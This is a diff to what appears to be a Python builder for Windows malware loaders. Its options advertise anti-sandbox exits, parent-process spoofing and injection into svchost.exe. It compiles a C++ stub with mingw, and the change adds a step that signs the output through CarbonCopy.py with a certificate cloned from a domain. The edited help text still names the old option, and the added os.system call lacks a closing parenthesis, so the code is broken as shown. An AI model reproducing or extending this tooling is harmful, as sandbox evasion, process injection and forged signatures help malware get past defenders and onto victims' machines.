@@ -34,7 +34,7 @@ parser.add_argument("--processors", metavar="NUMBER", help="Anti-Sandbox Check: 
 parser.add_argument("--ram", metavar="NUMBER", help="Anti-Sandbox Check: If the amount of RAM is < X GB, exit")
 parser.add_argument("--parent", metavar="PROCESS", default="explorer.exe", help="Specify the parent process for PPID spoofing, example --parent explorer.exe")
 parser.add_argument("--child", metavar="PROCESS", default="svchost.exe", help="Specify the process to spawn for injection into, example: --child svchost.exe")
-parser.add_argument("--clonesig", metavar="FILE", help="Specify a signed file to use for signature cloning, example: --clonesig C:\\\\chad\\\\Desktop\\\\SignedFile.exe")
+parser.add_argument("--domain", metavar="FILE", help="Specify a signed file to use for signature cloning, example: --clonesig C:\\\\chad\\\\Desktop\\\\SignedFile.exe")
 
 args = parser.parse_args()
 iFile = args.input
@@ -48,7 +48,7 @@ processors = args.processors
 ram = args.ram
 parent = args.parent
 child = args.child
-sig = args.clonesig
+domain = args.domain
 
 stub1 = """
 #include <windows.h>
@@ -1314,6 +1314,8 @@ def main():
 
     os.system("x86_64-w64-mingw32-g++ temp.cpp netapi32.dll -w -masm=intel -fpermissive -static -Wl,--subsystem,windows -O0 -o " + output + ".exe")
     os.system("rm temp.cpp")
+    os.system("chmod +x CarbonCopy.py")
+    os.system("./CarbonCopy.py " + domain + " 443 " + output + ".exe " + output + "-signed.exe" 
 
 
 main()
